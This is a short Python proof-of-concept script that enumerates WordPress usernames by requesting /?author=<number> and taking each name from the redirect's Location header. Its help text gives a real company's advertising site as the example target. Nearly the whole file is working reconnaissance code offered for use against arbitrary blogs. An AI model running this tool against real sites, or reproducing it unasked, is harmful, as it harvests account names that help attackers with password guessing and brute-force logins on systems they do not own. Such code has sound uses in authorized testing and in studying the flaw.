import sys
import requests


def enumusers(url,p):
        r = requests.get(url + '/?author=' + str(p), allow_redirects=False)
        if r.status_code > 300 and r.status_code < 399 :
                print r.headers['Location'].split('/')[4]
                                    
        
                
          

helpmsg = "PoC for WordPress Username enumeration via the /?author=<number> redirect vulnerabiltiy.\nCreated by Riyaz Ahemed Walikar\n\nUsage: wp_userenum_requests.py <blog_url> [max_number_users]\n\nExample: wp_userenum_requests.py https://advertising.paypal.com 20\n"
if len(sys.argv) < 2:
        print "Not enough parameters.\n"
        print helpmsg
        sys.exit()
        
url = sys.argv[1]
num_u = ""
if len(sys.argv) > 2:
	if sys.argv[2].isdigit() == 1:
		num_u = sys.argv[2]
	else:
		print "Invalid count! Please specify a positive integer to enumerate upto"
	

print "Starting enumeration on " + url + "\n"

if num_u == "":
	print "No upper limit specified, enumerating the default 20 users"
	num_u = 20
else:
	print "Enumerating the first " + str(num_u) + " users\n"

    
for i in range(1,int(num_u)+1):
	enumusers(url,i)
sys.exit()

    
print "Invalid parameters.\n"
print helpmsg
sys.exit()
